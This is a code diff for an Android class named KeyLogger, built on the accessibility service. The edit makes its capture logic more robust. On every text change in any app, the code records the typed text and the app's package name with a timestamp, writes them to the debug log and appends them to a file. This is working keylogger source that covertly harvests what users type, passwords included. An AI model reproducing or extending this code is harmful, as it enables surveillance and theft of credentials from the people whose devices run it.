@@ -23,6 +23,10 @@ public class KeyLogger extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
 
+        String data = "";
+
+        String dataPackage = "";
+
 
         Calendar c = Calendar.getInstance();
 
@@ -50,16 +54,22 @@ public class KeyLogger extends AccessibilityService {
         //Log.d(TAG, "onAccessibilityEvent: on or off : " + onOrOff);
         long unixTime = System.currentTimeMillis();
         if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED){
-            String data = accessibilityEvent.getText().toString();
-            String data2 = accessibilityEvent.getBeforeText().toString();
-            String data3 =  accessibilityEvent.getPackageName().toString();
+
+            try{
+                data = accessibilityEvent.getText().toString();
+            }catch(Exception e){
+                Log.d(TAG, "onAccessibilityEvent: exception caught");
+            }
+
+            try{
+                dataPackage =  accessibilityEvent.getPackageName().toString();
+            }catch(Exception e){
+                Log.d(TAG, "onAccessibilityEvent: caught excpetion");
+            }
 
             Log.d(TAG, "TIME: " + unixTime + ": The data is: " + data);
-            //Log.d(TAG, "onAccessibilityEvent: the before text is: " + data2);
-            //Log.d(TAG, "onAccessibilityEvent: the time is: " + unixTime);
-            Log.d(TAG,unixTime + "," + data3 +"," + data);
-
-            writeToFile(location, unixTime + "," + data3 +"," + data +"\n");
+            Log.d(TAG,unixTime + "," + dataPackage +"," + data);
+            writeToFile(location, unixTime + "," + dataPackage +"," + data +"\n");
         }
 
     }
